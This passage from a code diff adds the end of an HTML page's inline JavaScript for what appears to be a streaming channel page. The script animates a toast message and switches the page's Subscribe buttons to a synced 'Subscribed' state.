+      requestAnimationFrame(function () {
+        t.style.opacity = '1';
+        t.style.transform = 'translateX(-50%) translateY(0)';
+      });
+      setTimeout(function () {
+        t.style.opacity = '0';
+        t.style.transform = 'translateX(-50%) translateY(-12px)';
+        setTimeout(function () { t.remove(); }, 350);
+      }, 2800);
+    }
+
+    /* Turn any button into subscribed state */
+    function setSubscribed(btn) {
+      btn.textContent = '✓ Subscribed';
+      btn.disabled = true;
+      btn.style.background = '#374151';
+      btn.style.boxShadow  = 'none';
+      btn.style.cursor     = 'default';
+      btn.style.transform  = 'none';
+      ['bg-red-600','hover:bg-red-500','hover:scale-105',
+       'hover:shadow-lg','hover:shadow-red-900/40','active:scale-95'].forEach(function (c) {
+        btn.classList.remove(c);
+      });
+    }
+
+    /* Main red Subscribe button in channel bar */
+    var mainBtn = document.getElementById('btn-subscribe');
+    if (mainBtn) {
+      mainBtn.addEventListener('click', function () {
+        setSubscribed(mainBtn);
+        showToast('🔔 Subscribed! You\'ll be notified of new streams.');
+        /* Sync Quick Actions subscribe button */
+        document.querySelectorAll('button').forEach(function (b) {
+          if (b !== mainBtn && b.textContent.trim() === 'Subscribe') setSubscribed(b);
+        });
+      });
+    }
+
+    /* Quick Actions Subscribe button (click anywhere on page) */
+    document.addEventListener('click', function (e) {
+      var btn = e.target.closest('button');
+      if (!btn || btn.disabled || btn.id === 'btn-subscribe') return;
+      if (btn.textContent.trim() === 'Subscribe') {
+        setSubscribed(btn);
+        showToast('🔔 Subscribed! You\'ll be notified of new streams.');
+        if (mainBtn && !mainBtn.disabled) setSubscribed(mainBtn);
+      }
+    });
+  })();
+  </script>
+
+</body>
+</html>
